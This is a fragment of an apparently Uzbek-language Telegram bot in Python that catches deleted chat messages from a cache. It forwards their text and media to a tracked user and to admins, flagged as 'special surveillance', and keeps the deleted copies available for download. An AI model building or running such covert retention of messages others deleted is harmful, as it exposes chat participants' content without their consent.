                        text=cached_text,
                        caption=cached.get("caption")
                    )

            # 2) ADMINGA YUBORISH
            mode_tag = "🚨 <b>MAXSUS KUZATUV (O'CHIRILDI):</b>" if is_special else "🗑 <b>XABAR O'CHIRILDI:</b>"
            admin_header = (
                f"{mode_tag}\n\n"
                f"👤 <b>Foydalanuvchi:</b> {html.escape(user_name)}\n"
                f"💬 <b>Chat:</b> {html.escape(chat_title)}\n"
                f"👤 <b>Kim o'chirdi:</b> {html.escape(sender_str)}"
            )
            admin_cap = safe_format_caption(admin_header, f"[O'chirilgan {fallback_media}]\n{cached_text}")

            admin_markup = None
            if media_type:
                admin_markup = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="📥 Faylni yuklab olish", callback_data=f"dl_msg_{cached['id']}")]
                ])

            for admin_id in admin_ids:
                # Agar admin o'zi bu chatdagi foydalanuvchi bo'lsa va yuqorida bildirishnoma olgan bo'lsa, takrorlamaymiz
                if admin_id == tracked_user_id:
                    continue

                sent_adm = await send_saved_media(
                    bot=bot,
                    chat_id=admin_id,
                    media_type=media_type,
                    file_id=file_id,
                    local_file_path=local_path,
                    caption=admin_cap,
                    reply_markup=admin_markup
                )
                if sent_adm:
                    await db.save_sent_notification(
                        bot_message_id=sent_adm.message_id,
                        user_id=admin_id,
                        cached_id=cached.get("id"),
                        original_chat_id=event.chat.id,
                        original_message_id=msg_id,
                        media_type=media_type,
                        file_id=file_id,
                        local_file_path=local_path,
                        text=cached_text,
                        caption=cached.get("caption")
                    )

            # 3) Xabarni keshdan birdaniga o'chirib yubormaymiz, balki o'chirilgan deb belgilaymiz!
            # Shunda foydalanuvchi replay qilganda ("replay qilib har qanday xabar yozsa"), fayl keshda turadi va uni yuklab bera oladi.
            await db.mark_cached_message_deleted(event.chat.id, msg_id)

        else:
            # Keshda saqlanmagan xabar o'chirilganda
            logger.info(f"Keshda saqlanmagan xabar o'chirildi: chat={event.chat.id}, msg_id={msg_id}")
            if tracked_user_id:
                try:
                    await bot.send_message(
                        chat_id=tracked_user_id,
                        text=(
                            f"🗑 <b>Suhbatda xabar o'chirildi!</b>\n\n"
                            f"💬 <b>Chat:</b> {html.escape(chat_title)}\n"
                            f"🆔 <b>Message ID:</b> <code>{msg_id}</code>\n\n"
                            f"▫️ <i>(Ushbu xabar bot ulanishidan oldin yozilgani yoki muddati o'tgani sababli uning matni saqlanmagan)</i>"
                        ),
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.warning(f"Could not notify user of uncached deleted msg: {e}")

            if not is_admin_chat:
                mode_tag = "🚨 <b>MAXSUS KUZATUV (O'CHIRILDI):</b>" if is_special else "🗑 <b>XABAR O'CHIRILDI:</b>"
                admin_text = (
                    f"{mode_tag}\n\n"
                    f"👤 <b>Foydalanuvchi:</b> {html.escape(user_name)}\n"
                    f"💬 <b>Chat:</b> {html.escape(chat_title)}\n"
                    f"🆔 <b>Message ID:</b> <code>{msg_id}</code>\n"
                    f"▫️ <i>(Keshda saqlanmagan eski xabar)</i>"
                )
                await broadcast_to_admins(bot, admin_text)

